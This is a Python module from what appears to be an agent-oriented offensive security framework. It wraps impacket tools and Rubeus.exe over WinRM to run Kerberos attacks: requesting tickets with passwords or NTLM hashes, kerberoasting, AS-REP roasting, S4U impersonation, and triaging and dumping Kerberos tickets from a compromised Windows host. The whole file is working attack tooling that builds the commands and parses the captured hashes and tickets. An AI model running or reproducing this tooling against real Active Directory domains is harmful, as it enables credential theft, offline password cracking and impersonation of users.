"""Rubeus wrapper — Kerberos abuse via impacket (Linux) or WinRM (Windows)."""
from __future__ import annotations

import re
from typing import Any

from tools.base import OffensiveTool, ToolResult, ToolStatus
from tools.registry import register

_IMPACKET_BINARY = {
    "asktgt":     "impacket-getTGT",
    "kerberoast": "impacket-GetUserSPNs",
    "asreproast": "impacket-GetNPUsers",
    "s4u":        "impacket-getST",
}

_KRB_HASH = re.compile(r"^\$krb5(?:asrep|tgs)\$\S+", re.MULTILINE)
_CCACHE = re.compile(r"Saving ticket in\s+(\S+\.ccache)")
_TRIAGE_ROW = re.compile(
    r"\|\s*(?P<luid>0x[0-9a-fA-F]+)\s*\|"
    r"\s*(?P<user>[^|]+?)\s*\|"
    r"\s*(?P<service>[^|]+?)\s*\|"
)
_DUMP_USER = re.compile(r"UserName\s*:\s*(\S+)")
_DUMP_B64 = re.compile(r"Base64EncodedTicket\s*:\s*\n((?:\s{4,}[\w+/=]+\n)+)", re.MULTILINE)

_AUTH_FAILURES = (
    "STATUS_LOGON_FAILURE",
    "Kerberos SessionError",
    "KDC_ERR_PREAUTH_FAILED",
    "Connection refused",
    "Could not connect",
)


@register
class RubeusTool(OffensiveTool):
    name = "rubeus"
    phase = "lateral_movement"
    mitre_techniques = ["T1558.001", "T1558.002", "T1550.003"]
    description = """
    Kerberos abuse toolkit.

    Linux-compatible actions (impacket binaries):
      - asktgt      request TGT with password or NTLM hash → .ccache file
      - kerberoast  request TGS hashes for SPN accounts → offline cracking
      - asreproast  collect AS-REP hashes for no-preauth users
      - s4u         S4U2self/S4U2proxy abuse → impersonate target user

    Windows-host actions (Rubeus.exe via WinRM):
      - triage      enumerate all Kerberos tickets on the Windows pivot host
      - dump        extract base64 Kerberos tickets from the Windows pivot host

    triage/dump require winrm_host, winrm_user, winrm_password.
    """

    def param_schema(self) -> dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "enum": ["asktgt", "kerberoast", "asreproast", "s4u", "triage", "dump"],
                },
                "target_dc": {"type": "string", "description": "DC IP (impacket actions)"},
                "domain": {"type": "string"},
                "user": {"type": "string"},
                "password": {"type": "string"},
                "rc4": {"type": "string", "description": "NTLM hash (:NThash or LM:NThash)"},
                "spn": {"type": "string", "description": "Target SPN for s4u (e.g. cifs/host)"},
                "impersonate": {"type": "string", "description": "User to impersonate (s4u)"},
                "ticket": {"type": "string", "description": "Base64 .kirbi for pass-the-ticket"},
                "winrm_host": {"type": "string", "description": "Windows host IP for triage/dump"},
                "winrm_user": {"type": "string"},
                "winrm_password": {"type": "string"},
                "rubeus_path": {
                    "type": "string",
                    "description": "Path to Rubeus.exe on Windows host",
                    "default": r"C:\Tools\Rubeus.exe",
                },
            },
            "required": ["action"],
        }

    def execute(self, **params: Any) -> ToolResult:
        action = params.get("action")
        if action in _IMPACKET_BINARY:
            return self._impacket_action(action, params)
        if action in ("triage", "dump"):
            return self._winrm_action(action, params)
        return ToolResult(ToolStatus.ERROR, "", "", error=f"Unknown action: {action!r}")

    # ── impacket-backed Linux actions ─────────────────────────────────────────

    def _impacket_action(self, action: str, p: dict[str, Any]) -> ToolResult:
        try:
            argv = _build_argv(action, p)
        except _BadArgs as exc:
            return ToolResult(ToolStatus.ERROR, "", "", error=str(exc))

        rc, stdout, stderr, duration = self._run(argv)
        cmd = self.quote(argv)

        if rc == -1:
            return ToolResult(ToolStatus.TIMEOUT, cmd, stdout,
                              error=stderr.strip() or "timeout", duration_sec=duration)

        findings = _parse_impacket(action, stdout, stderr)
        findings["action"] = action

        combined = stdout + stderr
        if _auth_failed(combined):
            return ToolResult(ToolStatus.PARTIAL, cmd, combined,
                              error="authentication or connection failed",
                              findings=findings, duration_sec=duration)

        if rc != 0 and not findings.get("tickets") and not findings.get("ccache"):
            return ToolResult(
                ToolStatus.ERROR, cmd, combined,
                error=f"{_IMPACKET_BINARY[action]} exited {rc}: {stderr.strip()[:300]}",
                duration_sec=duration,
            )

        has_signal = bool(findings.get("tickets") or findings.get("ccache"))
        return ToolResult(
            status=ToolStatus.SUCCESS if has_signal else ToolStatus.NO_FINDINGS,
            command=cmd,
            raw_output=stdout,
            findings=findings,
            duration_sec=duration,
        )

    # ── WinRM-backed Windows actions ──────────────────────────────────────────

    def _winrm_action(self, action: str, p: dict[str, Any]) -> ToolResult:
        host = p.get("winrm_host")
        user = p.get("winrm_user")
        password = p.get("winrm_password")
        rubeus = p.get("rubeus_path") or r"C:\Tools\Rubeus.exe"

        if not host or not user or not password:
            return ToolResult(
                ToolStatus.ERROR, "", "",
                error="triage/dump require winrm_host, winrm_user, winrm_password",
            )

        try:
            output, error = self._winrm_run(host, user, password, rubeus, action)
        except Exception as exc:
            return ToolResult(ToolStatus.ERROR, rubeus, "", error=str(exc))

        if error:
            return ToolResult(ToolStatus.ERROR, rubeus, output, error=error)

        findings = _parse_rubeus(action, output)
        findings["action"] = action
        has_signal = bool(findings.get("ticket_count", 0))
        return ToolResult(
            status=ToolStatus.SUCCESS if has_signal else ToolStatus.NO_FINDINGS,
            command=f"{rubeus} {action} /nowrap",
            raw_output=output,
            findings=findings,
        )

    def _winrm_run(
        self, host: str, user: str, password: str, rubeus_path: str, action: str
    ) -> tuple[str, str | None]:
        try:
            import winrm  # type: ignore[import]
        except ImportError:
            return "", "pywinrm not installed — run: pip install pywinrm"

        session = winrm.Session(
            f"http://{host}:5985/wsman",
            auth=(user, password),
            transport="ntlm",
        )
        result = session.run_ps(f'& "{rubeus_path}" {action} /nowrap')
        stdout = result.std_out.decode("utf-8", errors="replace")
        stderr = result.std_err.decode("utf-8", errors="replace")

        if result.status_code != 0:
            return stdout, stderr.strip() or f"Rubeus exited {result.status_code}"
        return stdout, None


# ─────────────────────────────────────────────────────────────────────────────
# argv construction
# ─────────────────────────────────────────────────────────────────────────────


class _BadArgs(ValueError):
    pass


def _build_argv(action: str, p: dict[str, Any]) -> list[str]:
    binary = _IMPACKET_BINARY[action]
    dc = p.get("target_dc")
    domain = p.get("domain")
    user = p.get("user")
    password = p.get("password")
    rc4 = p.get("rc4")

    if not dc or not domain:
        raise _BadArgs(f"{action} requires target_dc and domain")
    if not user:
        raise _BadArgs(f"{action} requires user")

    principal = f"{domain}/{user}:{password}" if password else f"{domain}/{user}"

    if action == "asktgt":
        if not password and not rc4:
            raise _BadArgs("asktgt requires password or rc4")
        argv = [binary, principal, "-dc-ip", dc]
        if rc4:
            argv += ["-hashes", rc4]
        return argv

    if action == "kerberoast":
        if not password and not rc4:
            raise _BadArgs("kerberoast requires password or rc4")
        argv = [binary, principal, "-dc-ip", dc, "-request"]
        if rc4:
            argv += ["-hashes", rc4]
        return argv

    if action == "asreproast":
        if password or rc4:
            argv = [binary, principal, "-dc-ip", dc, "-request"]
            if rc4:
                argv += ["-hashes", rc4]
        else:
            argv = [binary, f"{domain}/", "-dc-ip", dc, "-no-pass"]
        return argv

    if action == "s4u":
        spn = p.get("spn")
        impersonate = p.get("impersonate")
        if not spn:
            raise _BadArgs("s4u requires spn")
        if not impersonate:
            raise _BadArgs("s4u requires impersonate")
        if not password and not rc4:
            raise _BadArgs("s4u requires password or rc4")
        argv = [binary, "-spn", spn, "-impersonate", impersonate, "-dc-ip", dc, principal]
        if rc4:
            argv += ["-hashes", rc4]
        return argv

    raise _BadArgs(f"unhandled action: {action}")


# ─────────────────────────────────────────────────────────────────────────────
# Parsing
# ─────────────────────────────────────────────────────────────────────────────


def _parse_impacket(action: str, stdout: str, stderr: str) -> dict[str, Any]:
    combined = stdout + stderr

    if action in ("kerberoast", "asreproast"):
        hash_type = "krb5tgs" if action == "kerberoast" else "krb5asrep"
        tickets = [m.group(0).strip() for m in _KRB_HASH.finditer(stdout)]
        return {"tickets": tickets, "count": len(tickets), "hash_type": hash_type}

    if action in ("asktgt", "s4u"):
        ccache = _CCACHE.search(combined)
        return {
            "ccache": ccache.group(1) if ccache else None,
            "success": ccache is not None,
        }

    return {}


def _parse_rubeus(action: str, output: str) -> dict[str, Any]:
    if action == "triage":
        tickets = []
        for m in _TRIAGE_ROW.finditer(output):
            luid = m.group("luid").strip()
            if luid == "LUID":
                continue
            tickets.append({
                "luid": luid,
                "user": m.group("user").strip(),
                "service": m.group("service").strip(),
            })
        return {"tickets": tickets, "ticket_count": len(tickets)}

    if action == "dump":
        users = _DUMP_USER.findall(output)
        b64_tickets = [
            t.replace("\n", "").replace(" ", "")
            for t in _DUMP_B64.findall(output)
        ]
        return {
            "users": list(dict.fromkeys(users)),
            "tickets": b64_tickets,
            "ticket_count": len(b64_tickets),
        }

    return {}


def _auth_failed(text: str) -> bool:
    return any(p in text for p in _AUTH_FAILURES)
